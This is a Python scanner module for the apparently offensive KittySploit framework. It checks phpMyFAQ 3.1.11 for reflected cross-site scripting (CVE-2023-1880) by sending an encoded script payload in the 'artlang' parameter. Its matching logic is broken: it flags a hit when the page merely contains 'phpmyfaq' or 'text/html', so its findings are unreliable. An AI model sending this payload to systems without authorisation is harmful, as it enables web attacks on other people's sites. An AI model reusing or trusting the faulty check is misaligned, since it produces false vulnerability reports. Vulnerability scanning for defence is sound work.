#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Phpmyfaq v3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Phpmyfaq v3.1.11 - Cross-Site Scripting Detection',
        'description': "Phpmyfaq v3.1.11 is vulnerable to reflected XSS in send2friend because the 'artlang' parameter is not sanitized.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'huntr', 'xss', 'phpmyfaq', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.dev/bounties/ece5f051-674e-4919-b998-594714910f9e',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-1880',
            'https://github.com/thorsten/phpmyfaq/commit/bbc5d4aa4a4375c14e34dd9fcad2042066fe476d',
        ],
        'cve': 'CVE-2023-1880',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?action=send2friend&artlang=aaaa%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('phpmyfaq', '<script>alert(document.domain)</script>', 'text/html',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Phpmyfaq v3.1.11 - Cross-Site Scripting detected",
                path='/?action=send2friend&artlang=aaaa%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

